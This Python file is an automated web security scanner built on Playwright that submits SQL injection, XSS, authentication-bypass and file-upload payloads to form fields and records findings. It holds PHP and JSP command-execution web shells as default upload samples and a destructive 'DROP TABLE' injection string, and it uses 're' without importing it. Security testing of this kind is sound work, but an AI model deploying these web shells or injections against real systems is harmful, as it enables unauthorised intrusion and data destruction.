"""
Test Case Execution Engine for Agentic Security Testing
"""

import asyncio
import json
import uuid
import os
import time
import logging
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from playwright.async_api import async_playwright
import requests
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger(__name__)

class TestStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    SKIPPED = "skipped"

class TestSeverity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

@dataclass
class TestResult:
    test_id: str
    test_name: str
    status: TestStatus
    severity: TestSeverity
    start_time: datetime
    end_time: Optional[datetime] = None
    duration: Optional[float] = None
    findings: List[Dict[str, Any]] = None
    error: Optional[str] = None
    evidence: List[Dict[str, Any]] = None
    screenshots: List[str] = None
    logs: List[str] = None

class TestExecutionEngine:
    """
    Advanced test case execution engine for security testing
    """
    
    def __init__(self, headless: bool = True, timeout: int = 30):
        self.headless = headless
        self.timeout = timeout
        self.results = []
        self.screenshots_dir = "screenshots"
        
        # Create screenshots directory
        os.makedirs(self.screenshots_dir, exist_ok=True)
    
    async def execute_test_suite(self, test_cases: List[Dict[str, Any]], target_url: str) -> List[TestResult]:
        """
        Execute a suite of test cases against a target URL
        """
        logger.info(f"🚀 Starting test suite execution with {len(test_cases)} test cases")
        
        results = []
        
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=self.headless)
            
            try:
                for i, test_case in enumerate(test_cases):
                    logger.info(f"🧪 Executing test {i+1}/{len(test_cases)}: {test_case.get('test_name', 'Unknown')}")
                    
                    result = await self._execute_single_test(browser, test_case, target_url)
                    results.append(result)
                    
                    # Add delay between tests to avoid overwhelming the target
                    if i < len(test_cases) - 1:
                        await asyncio.sleep(1)
            
            finally:
                await browser.close()
        
        self.results = results
        return results
    
    async def _execute_single_test(self, browser, test_case: Dict[str, Any], target_url: str) -> TestResult:
        """
        Execute a single test case
        """
        test_id = str(uuid.uuid4())
        test_name = test_case.get("test_name", "Unknown Test")
        start_time = datetime.now()
        
        result = TestResult(
            test_id=test_id,
            test_name=test_name,
            status=TestStatus.PENDING,
            severity=TestSeverity.MEDIUM,
            start_time=start_time,
            findings=[],
            evidence=[],
            screenshots=[],
            logs=[]
        )
        
        try:
            # Update status to running
            result.status = TestStatus.RUNNING
            
            # Create new page for this test
            page = await browser.new_page()
            
            # Set up page event listeners
            await self._setup_page_listeners(page, result)
            
            # Execute the test based on its type
            test_type = test_case.get("attack_type", "general")
            
            if test_type == "sql_injection":
                await self._execute_sql_injection_test(page, test_case, target_url, result)
            elif test_type == "xss":
                await self._execute_xss_test(page, test_case, target_url, result)
            elif test_type == "idor":
                await self._execute_idor_test(page, test_case, target_url, result)
            elif test_type == "authentication":
                await self._execute_authentication_test(page, test_case, target_url, result)
            elif test_type == "authorization":
                await self._execute_authorization_test(page, test_case, target_url, result)
            elif test_type == "business_logic":
                await self._execute_business_logic_test(page, test_case, target_url, result)
            elif test_type == "file_upload":
                await self._execute_file_upload_test(page, test_case, target_url, result)
            elif test_type == "api_testing":
                await self._execute_api_test(page, test_case, target_url, result)
            else:
                await self._execute_general_test(page, test_case, target_url, result)
            
            # Mark as completed
            result.status = TestStatus.COMPLETED
            
        except Exception as e:
            logger.error(f"Test execution failed: {str(e)}")
            result.status = TestStatus.FAILED
            result.error = str(e)
        
        finally:
            # Calculate duration
            result.end_time = datetime.now()
            result.duration = (result.end_time - result.start_time).total_seconds()
            
            # Close the page
            if 'page' in locals():
                await page.close()
        
        return result
    
    async def _setup_page_listeners(self, page, result: TestResult):
        """
        Set up page event listeners for logging and evidence collection
        """
        # Log console messages
        page.on("console", lambda msg: result.logs.append(f"Console: {msg.text}"))
        
        # Log page errors
        page.on("pageerror", lambda error: result.logs.append(f"Page Error: {error}"))
        
        # Log network requests
        page.on("request", lambda request: result.logs.append(f"Request: {request.method} {request.url}"))
        
        # Log network responses
        page.on("response", lambda response: result.logs.append(f"Response: {response.status} {response.url}"))
    
    async def _execute_sql_injection_test(self, page, test_case: Dict[str, Any], target_url: str, result: TestResult):
        """
        Execute SQL injection test
        """
        payloads = test_case.get("payloads", [])
        endpoints = test_case.get("endpoints", [target_url])
        detection_patterns = test_case.get("detection_patterns", [])
        
        for endpoint in endpoints:
            for payload in payloads:
                try:
                    # Navigate to the endpoint
                    await page.goto(endpoint)
                    
                    # Look for input fields
                    input_fields = await page.query_selector_all('input[type="text"], input[type="search"], textarea, input[name*="search"], input[name*="query"]')
                    
                    for input_field in input_fields:
                        # Clear and fill the input
                        await input_field.clear()
                        await input_field.fill(payload)
                        
                        # Submit the form
                        form = await input_field.query_selector('xpath=ancestor::form')
                        if form:
                            submit_button = await form.query_selector('button[type="submit"], input[type="submit"]')
                            if submit_button:
                                await submit_button.click()
                                
                                # Wait for response
                                await page.wait_for_timeout(2000)
                                
                                # Check for SQL injection indicators
                                content = await page.content()
                                
                                for pattern in detection_patterns:
                                    if pattern.lower() in content.lower():
                                        finding = {
                                            "type": "sql_injection",
                                            "severity": "high",
                                            "description": f"SQL injection detected with payload: {payload}",
                                            "evidence": f"Pattern '{pattern}' found in response",
                                            "payload": payload,
                                            "endpoint": endpoint,
                                            "input_field": await input_field.get_attribute("name") or "unknown"
                                        }
                                        result.findings.append(finding)
                                        
                                        # Take screenshot
                                        screenshot_path = await self._take_screenshot(page, result.test_id, f"sql_injection_{len(result.findings)}")
                                        result.screenshots.append(screenshot_path)
                                        
                                        # Add evidence
                                        result.evidence.append({
                                            "type": "response_content",
                                            "content": content[:1000],  # First 1000 chars
                                            "pattern_matched": pattern
                                        })
                
                except Exception as e:
                    result.logs.append(f"SQL injection test error: {str(e)}")
    
    async def _execute_xss_test(self, page, test_case: Dict[str, Any], target_url: str, result: TestResult):
        """
        Execute XSS test
        """
        payloads = test_case.get("payloads", [])
        endpoints = test_case.get("endpoints", [target_url])
        detection_patterns = test_case.get("detection_patterns", [])
        
        for endpoint in endpoints:
            for payload in payloads:
                try:
                    # Navigate to the endpoint
                    await page.goto(endpoint)
                    
                    # Look for input fields
                    input_fields = await page.query_selector_all('input[type="text"], input[type="search"], textarea, input[name*="comment"], input[name*="message"]')
                    
                    for input_field in input_fields:
                        # Clear and fill the input
                        await input_field.clear()
                        await input_field.fill(payload)
                        
                        # Submit the form
                        form = await input_field.query_selector('xpath=ancestor::form')
                        if form:
                            submit_button = await form.query_selector('button[type="submit"], input[type="submit"]')
                            if submit_button:
                                await submit_button.click()
                                
                                # Wait for response
                                await page.wait_for_timeout(2000)
                                
                                # Check for XSS indicators
                                content = await page.content()
                                
                                for pattern in detection_patterns:
                                    if pattern.lower() in content.lower():
                                        finding = {
                                            "type": "xss",
                                            "severity": "high",
                                            "description": f"XSS vulnerability detected with payload: {payload}",
                                            "evidence": f"Pattern '{pattern}' found in response",
                                            "payload": payload,
                                            "endpoint": endpoint,
                                            "input_field": await input_field.get_attribute("name") or "unknown"
                                        }
                                        result.findings.append(finding)
                                        
                                        # Take screenshot
                                        screenshot_path = await self._take_screenshot(page, result.test_id, f"xss_{len(result.findings)}")
                                        result.screenshots.append(screenshot_path)
                                        
                                        # Add evidence
                                        result.evidence.append({
                                            "type": "response_content",
                                            "content": content[:1000],
                                            "pattern_matched": pattern
                                        })
                
                except Exception as e:
                    result.logs.append(f"XSS test error: {str(e)}")
    
    async def _execute_idor_test(self, page, test_case: Dict[str, Any], target_url: str, result: TestResult):
        """
        Execute IDOR (Insecure Direct Object Reference) test
        """
        endpoints = test_case.get("endpoints", [target_url])
        
        for endpoint in endpoints:
            try:
                # Navigate to the endpoint
                await page.goto(endpoint)
                
                # Look for ID parameters in the URL
                current_url = page.url
                
                # Try to modify ID parameters
                if "id=" in current_url:
                    # Try different ID values
                    test_ids = ["1", "2", "999", "0", "-1", "admin"]
                    
                    for test_id in test_ids:
                        modified_url = current_url.replace("id=1", f"id={test_id}")
                        
                        try:
                            response = await page.goto(modified_url)
                            
                            if response and response.status == 200:
                                content = await page.content()
                                
                                # Check if we can access other users' data
                                if "unauthorized" not in content.lower() and "forbidden" not in content.lower():
                                    finding = {
                                        "type": "idor",
                                        "severity": "high",
                                        "description": f"IDOR vulnerability detected - able to access resource with ID: {test_id}",
                                        "evidence": f"Successfully accessed {modified_url}",
                                        "endpoint": modified_url,
                                        "test_id": test_id
                                    }
                                    result.findings.append(finding)
                                    
                                    # Take screenshot
                                    screenshot_path = await self._take_screenshot(page, result.test_id, f"idor_{len(result.findings)}")
                                    result.screenshots.append(screenshot_path)
                                    
                                    # Add evidence
                                    result.evidence.append({
                                        "type": "url_access",
                                        "url": modified_url,
                                        "status_code": response.status,
                                        "content_preview": content[:500]
                                    })
                        
                        except Exception as e:
                            result.logs.append(f"IDOR test error for ID {test_id}: {str(e)}")
                
            except Exception as e:
                result.logs.append(f"IDOR test error: {str(e)}")
    
    async def _execute_authentication_test(self, page, test_case: Dict[str, Any], target_url: str, result: TestResult):
        """
        Execute authentication bypass test
        """
        endpoints = test_case.get("endpoints", [target_url])
        payloads = test_case.get("payloads", [])
        
        for endpoint in endpoints:
            try:
                # Navigate to login page
                login_url = f"{target_url}/login" if not endpoint.endswith("/login") else endpoint
                await page.goto(login_url)
                
                # Look for login form
                username_field = await page.query_selector('input[name="username"], input[name="email"], input[type="email"]')
                password_field = await page.query_selector('input[name="password"], input[type="password"]')
                
                if username_field and password_field:
                    # Try authentication bypass payloads
                    for payload in payloads:
                        try:
                            # Fill username with payload
                            await username_field.clear()
                            await username_field.fill(payload)
                            
                            # Fill password with payload
                            await password_field.clear()
                            await password_field.fill(payload)
                            
                            # Submit form
                            submit_button = await page.query_selector('button[type="submit"], input[type="submit"]')
                            if submit_button:
                                await submit_button.click()
                                
                                # Wait for response
                                await page.wait_for_timeout(3000)
                                
                                # Check if login was successful
                                current_url = page.url
                                content = await page.content()
                                
                                # Look for success indicators
                                success_indicators = ["dashboard", "welcome", "profile", "admin", "success"]
                                
                                for indicator in success_indicators:
                                    if indicator in current_url.lower() or indicator in content.lower():
                                        finding = {
                                            "type": "authentication_bypass",
                                            "severity": "critical",
                                            "description": f"Authentication bypass detected with payload: {payload}",
                                            "evidence": f"Successfully logged in with payload, redirected to: {current_url}",
                                            "payload": payload,
                                            "endpoint": login_url
                                        }
                                        result.findings.append(finding)
                                        
                                        # Take screenshot
                                        screenshot_path = await self._take_screenshot(page, result.test_id, f"auth_bypass_{len(result.findings)}")
                                        result.screenshots.append(screenshot_path)
                                        
                                        # Add evidence
                                        result.evidence.append({
                                            "type": "authentication_success",
                                            "payload": payload,
                                            "redirect_url": current_url,
                                            "content_preview": content[:500]
                                        })
                                        break
                        
                        except Exception as e:
                            result.logs.append(f"Authentication test error for payload {payload}: {str(e)}")
                
            except Exception as e:
                result.logs.append(f"Authentication test error: {str(e)}")
    
    async def _execute_authorization_test(self, page, test_case: Dict[str, Any], target_url: str, result: TestResult):
        """
        Execute authorization bypass test
        """
        endpoints = test_case.get("endpoints", [target_url])
        
        for endpoint in endpoints:
            try:
                # Navigate to the endpoint
                await page.goto(endpoint)
                
                # Look for admin or protected functionality
                admin_links = await page.query_selector_all('a[href*="admin"], a[href*="manage"], a[href*="delete"], a[href*="edit"]')
                
                for link in admin_links:
                    try:
                        # Click the admin link
                        await link.click()
                        
                        # Wait for response
                        await page.wait_for_timeout(2000)
                        
                        # Check if we can access admin functionality
                        current_url = page.url
                        content = await page.content()
                        
                        # Look for access denied indicators
                        access_denied_indicators = ["unauthorized", "forbidden", "access denied", "403", "401"]
                        
                        access_denied = any(indicator in content.lower() for indicator in access_denied_indicators)
                        
                        if not access_denied:
                            finding = {
                                "type": "authorization_bypass",
                                "severity": "high",
                                "description": f"Authorization bypass detected - able to access admin functionality",
                                "evidence": f"Successfully accessed admin link: {await link.get_attribute('href')}",
                                "endpoint": current_url,
                                "admin_link": await link.get_attribute('href')
                            }
                            result.findings.append(finding)
                            
                            # Take screenshot
                            screenshot_path = await self._take_screenshot(page, result.test_id, f"authz_bypass_{len(result.findings)}")
                            result.screenshots.append(screenshot_path)
                            
                            # Add evidence
                            result.evidence.append({
                                "type": "admin_access",
                                "admin_link": await link.get_attribute('href'),
                                "current_url": current_url,
                                "content_preview": content[:500]
                            })
                    
                    except Exception as e:
                        result.logs.append(f"Authorization test error for link: {str(e)}")
                
            except Exception as e:
                result.logs.append(f"Authorization test error: {str(e)}")
    
    async def _execute_business_logic_test(self, page, test_case: Dict[str, Any], target_url: str, result: TestResult):
        """
        Execute business logic test
        """
        test_steps = test_case.get("test_steps", [])
        
        try:
            for step in test_steps:
                if step.get("type") == "navigate":
                    await page.goto(f"{target_url}{step.get('url', '')}")
                elif step.get("type") == "click":
                    element = await page.query_selector(step.get("selector", ""))
                    if element:
                        await element.click()
                elif step.get("type") == "fill":
                    element = await page.query_selector(step.get("selector", ""))
                    if element:
                        await element.fill(step.get("value", ""))
                elif step.get("type") == "wait":
                    await page.wait_for_timeout(step.get("duration", 1000))
                
                # Check for business logic vulnerabilities
                if step.get("check_vulnerabilities"):
                    await self._check_business_logic_vulnerabilities(page, result)
        
        except Exception as e:
            result.logs.append(f"Business logic test error: {str(e)}")
    
    async def _check_business_logic_vulnerabilities(self, page, result: TestResult):
        """
        Check for business logic vulnerabilities
        """
        try:
            # Check for price manipulation
            price_inputs = await page.query_selector_all('input[name*="price"], input[name*="amount"], input[name*="cost"]')
            
            for price_input in price_inputs:
                # Try to set negative price
                await price_input.clear()
                await price_input.fill("-100")
                
                # Check if negative price was accepted
                content = await page.content()
                if "error" not in content.lower() and "invalid" not in content.lower():
                    finding = {
                        "type": "price_manipulation",
                        "severity": "high",
                        "description": "Price manipulation vulnerability detected",
                        "evidence": "Application accepted negative price value",
                        "input_field": await price_input.get_attribute("name") or "unknown"
                    }
                    result.findings.append(finding)
            
            # Check for race conditions
            forms = await page.query_selector_all('form')
            
            for form in forms:
                submit_button = await form.query_selector('button[type="submit"], input[type="submit"]')
                if submit_button:
                    # Submit form multiple times quickly
                    for _ in range(3):
                        await submit_button.click()
                        await page.wait_for_timeout(100)
                    
                    # Check for duplicate submissions
                    content = await page.content()
                    if content.count("success") > 1 or content.count("created") > 1:
                        finding = {
                            "type": "race_condition",
                            "severity": "medium",
                            "description": "Race condition vulnerability detected",
                            "evidence": "Multiple form submissions processed"
                        }
                        result.findings.append(finding)
        
        except Exception as e:
            result.logs.append(f"Business logic vulnerability check error: {str(e)}")
    
    async def _execute_file_upload_test(self, page, test_case: Dict[str, Any], target_url: str, result: TestResult):
        """
        Execute file upload test
        """
        malicious_files = test_case.get("malicious_files", [
            ("test.php", "<?php system($_GET['cmd']); ?>"),
            ("test.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"),
            ("test.html", "<script>alert('XSS')</script>")
        ])
        
        for filename, content in malicious_files:
            try:
                # Navigate to upload page
                upload_url = f"{target_url}/upload"
                await page.goto(upload_url)
                
                # Look for file input
                file_input = await page.query_selector('input[type="file"]')
                
                if file_input:
                    # Create temporary file
                    temp_file = f"/tmp/{filename}"
                    with open(temp_file, "w") as f:
                        f.write(content)
                    
                    # Upload file
                    await file_input.set_input_files(temp_file)
                    
                    # Submit form
                    submit_button = await page.query_selector('button[type="submit"], input[type="submit"]')
                    if submit_button:
                        await submit_button.click()
                        
                        # Wait for response
                        await page.wait_for_timeout(2000)
                        
                        # Check if file was uploaded
                        response_content = await page.content()
                        if "success" in response_content.lower() or "uploaded" in response_content.lower():
                            finding = {
                                "type": "file_upload_vulnerability",
                                "severity": "high",
                                "description": f"Malicious file upload vulnerability detected: {filename}",
                                "evidence": f"File {filename} was accepted for upload",
                                "filename": filename
                            }
                            result.findings.append(finding)
                            
                            # Take screenshot
                            screenshot_path = await self._take_screenshot(page, result.test_id, f"file_upload_{len(result.findings)}")
                            result.screenshots.append(screenshot_path)
                    
                    # Clean up temp file
                    os.remove(temp_file)
            
            except Exception as e:
                result.logs.append(f"File upload test error for {filename}: {str(e)}")
    
    async def _execute_api_test(self, page, test_case: Dict[str, Any], target_url: str, result: TestResult):
        """
        Execute API test
        """
        endpoints = test_case.get("endpoints", [target_url])
        payloads = test_case.get("payloads", [])
        method = test_case.get("method", "GET")
        
        for endpoint in endpoints:
            for payload in payloads:
                try:
                    # Make API request
                    if method.upper() == "GET":
                        response = requests.get(endpoint, params=payload, timeout=10)
                    elif method.upper() == "POST":
                        response = requests.post(endpoint, json=payload, timeout=10)
                    elif method.upper() == "PUT":
                        response = requests.put(endpoint, json=payload, timeout=10)
                    elif method.upper() == "DELETE":
                        response = requests.delete(endpoint, timeout=10)
                    else:
                        response = requests.get(endpoint, timeout=10)
                    
                    # Check for vulnerabilities
                    if response.status_code >= 400:
                        content = response.text
                        
                        # Check for information disclosure
                        sensitive_patterns = ["error", "exception", "stack trace", "file path", "database"]
                        
                        for pattern in sensitive_patterns:
                            if pattern.lower() in content.lower():
                                finding = {
                                    "type": "api_information_disclosure",
                                    "severity": "medium",
                                    "description": f"API information disclosure detected",
                                    "evidence": f"Pattern '{pattern}' found in error response",
                                    "endpoint": endpoint,
                                    "method": method,
                                    "status_code": response.status_code
                                }
                                result.findings.append(finding)
                                
                                # Add evidence
                                result.evidence.append({
                                    "type": "api_response",
                                    "endpoint": endpoint,
                                    "method": method,
                                    "status_code": response.status_code,
                                    "response_content": content[:1000]
                                })
                
                except Exception as e:
                    result.logs.append(f"API test error for {endpoint}: {str(e)}")
    
    async def _execute_general_test(self, page, test_case: Dict[str, Any], target_url: str, result: TestResult):
        """
        Execute general security test
        """
        try:
            # Navigate to target
            await page.goto(target_url)
            
            # Check for common security issues
            await self._check_security_headers(page, result)
            await self._check_sensitive_data_exposure(page, result)
            await self._check_error_messages(page, result)
        
        except Exception as e:
            result.logs.append(f"General test error: {str(e)}")
    
    async def _check_security_headers(self, page, result: TestResult):
        """
        Check for missing security headers
        """
        try:
            response = await page.goto(page.url)
            headers = response.headers if response else {}
            
            required_headers = {
                'X-Frame-Options': 'Prevents clickjacking',
                'X-Content-Type-Options': 'Prevents MIME type sniffing',
                'X-XSS-Protection': 'Enables XSS filtering',
                'Strict-Transport-Security': 'Enforces HTTPS',
                'Content-Security-Policy': 'Prevents XSS and data injection'
            }
            
            for header, description in required_headers.items():
                if header not in headers:
                    finding = {
                        "type": "missing_security_header",
                        "severity": "medium",
                        "description": f"Missing {header} header",
                        "evidence": f"{header} header not present in response",
                        "recommendation": f"Add {header} header: {description}"
                    }
                    result.findings.append(finding)
        
        except Exception as e:
            result.logs.append(f"Security header check error: {str(e)}")
    
    async def _check_sensitive_data_exposure(self, page, result: TestResult):
        """
        Check for sensitive data exposure
        """
        try:
            content = await page.content()
            
            sensitive_patterns = [
                r'password["\']?\s*[:=]\s*["\'][^"\']+["\']',
                r'api[_-]?key["\']?\s*[:=]\s*["\'][^"\']+["\']',
                r'secret["\']?\s*[:=]\s*["\'][^"\']+["\']',
                r'token["\']?\s*[:=]\s*["\'][^"\']+["\']',
                r'ssn["\']?\s*[:=]\s*["\'][^"\']+["\']'
            ]
            
            for pattern in sensitive_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    finding = {
                        "type": "sensitive_data_exposure",
                        "severity": "high",
                        "description": "Sensitive data exposed in page content",
                        "evidence": f"Pattern '{pattern}' found in response",
                        "recommendation": "Remove or mask sensitive data in client-side code"
                    }
                    result.findings.append(finding)
        
        except Exception as e:
            result.logs.append(f"Sensitive data exposure check error: {str(e)}")
    
    async def _check_error_messages(self, page, result: TestResult):
        """
        Check for information disclosure in error messages
        """
        try:
            # Try to trigger error conditions
            error_urls = [
                f"{page.url}/nonexistent",
                f"{page.url}/api/invalid",
                f"{page.url}/admin/forbidden"
            ]
            
            for error_url in error_urls:
                try:
                    response = await page.goto(error_url)
                    if response and response.status >= 400:
                        content = await page.content()
                        
                        # Check for sensitive information in error messages
                        sensitive_patterns = [
                            "stack trace", "file path", "database error",
                            "sql error", "password", "secret", "key"
                        ]
                        
                        for pattern in sensitive_patterns:
                            if pattern.lower() in content.lower():
                                finding = {
                                    "type": "information_disclosure",
                                    "severity": "low",
                                    "description": "Sensitive information in error message",
                                    "evidence": f"Error message contains: {pattern}",
                                    "url": error_url
                                }
                                result.findings.append(finding)
                
                except Exception as e:
                    result.logs.append(f"Error message check error for {error_url}: {str(e)}")
    
    async def _take_screenshot(self, page, test_id: str, name: str) -> str:
        """
        Take a screenshot of the current page
        """
        try:
            screenshot_path = f"{self.screenshots_dir}/{test_id}_{name}.png"
            await page.screenshot(path=screenshot_path)
            return screenshot_path
        except Exception as e:
            logger.warning(f"Screenshot failed: {str(e)}")
            return ""
    
    def generate_report(self, results: List[TestResult]) -> Dict[str, Any]:
        """
        Generate a comprehensive test report
        """
        total_tests = len(results)
        completed_tests = len([r for r in results if r.status == TestStatus.COMPLETED])
        failed_tests = len([r for r in results if r.status == TestStatus.FAILED])
        total_findings = sum(len(r.findings) for r in results)
        
        # Categorize findings by severity
        severity_counts = {
            "critical": 0,
            "high": 0,
            "medium": 0,
            "low": 0,
            "info": 0
        }
        
        for result in results:
            for finding in result.findings:
                severity = finding.get("severity", "medium")
                if severity in severity_counts:
                    severity_counts[severity] += 1
        
        # Calculate risk score
        risk_score = (
            severity_counts["critical"] * 10 +
            severity_counts["high"] * 7 +
            severity_counts["medium"] * 4 +
            severity_counts["low"] * 1
        )
        
        # Get top findings
        all_findings = []
        for result in results:
            for finding in result.findings:
                finding["test_name"] = result.test_name
                finding["test_id"] = result.test_id
                all_findings.append(finding)
        
        # Sort by severity
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        all_findings.sort(key=lambda x: severity_order.get(x.get("severity", "medium"), 2))
        
        report = {
            "summary": {
                "total_tests": total_tests,
                "completed_tests": completed_tests,
                "failed_tests": failed_tests,
                "success_rate": f"{(completed_tests / total_tests * 100):.1f}%" if total_tests > 0 else "0%",
                "total_findings": total_findings,
                "risk_score": risk_score
            },
            "severity_breakdown": severity_counts,
            "top_findings": all_findings[:10],  # Top 10 findings
            "test_results": [
                {
                    "test_id": r.test_id,
                    "test_name": r.test_name,
                    "status": r.status.value,
                    "duration": r.duration,
                    "findings_count": len(r.findings),
                    "error": r.error
                }
                for r in results
            ],
            "generated_at": datetime.now().isoformat()
        }
        
        return report

# Example usage
async def main():
    """
    Example usage of the Test Execution Engine
    """
    # Sample test cases
    test_cases = [
        {
            "test_name": "SQL Injection Test",
            "attack_type": "sql_injection",
            "payloads": ["' OR '1'='1", "'; DROP TABLE users; --"],
            "endpoints": ["https://httpbin.org/forms/post"],
            "detection_patterns": ["error", "exception", "sql"]
        },
        {
            "test_name": "XSS Test",
            "attack_type": "xss",
            "payloads": ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
            "endpoints": ["https://httpbin.org/forms/post"],
            "detection_patterns": ["<script>", "javascript:", "onerror"]
        },
        {
            "test_name": "Security Headers Test",
            "attack_type": "general",
            "endpoints": ["https://httpbin.org"]
        }
    ]
    
    # Initialize the engine
    engine = TestExecutionEngine(headless=True)
    
    # Execute tests
    print("🚀 Starting test execution...")
    results = await engine.execute_test_suite(test_cases, "https://httpbin.org")
    
    # Generate report
    report = engine.generate_report(results)
    
    # Print summary
    print(f"\n📊 Test Execution Summary")
    print(f"Total Tests: {report['summary']['total_tests']}")
    print(f"Completed: {report['summary']['completed_tests']}")
    print(f"Failed: {report['summary']['failed_tests']}")
    print(f"Success Rate: {report['summary']['success_rate']}")
    print(f"Total Findings: {report['summary']['total_findings']}")
    print(f"Risk Score: {report['summary']['risk_score']}")
    
    # Print findings
    if report['top_findings']:
        print(f"\n🔍 Top Findings:")
        for i, finding in enumerate(report['top_findings'], 1):
            print(f"  {i}. {finding['description']} (Severity: {finding['severity']})")
    
    # Save report
    with open("test_execution_report.json", "w") as f:
        json.dump(report, f, indent=2, default=str)
    
    print(f"\n📄 Report saved to test_execution_report.json")

if __name__ == "__main__":
    asyncio.run(main())
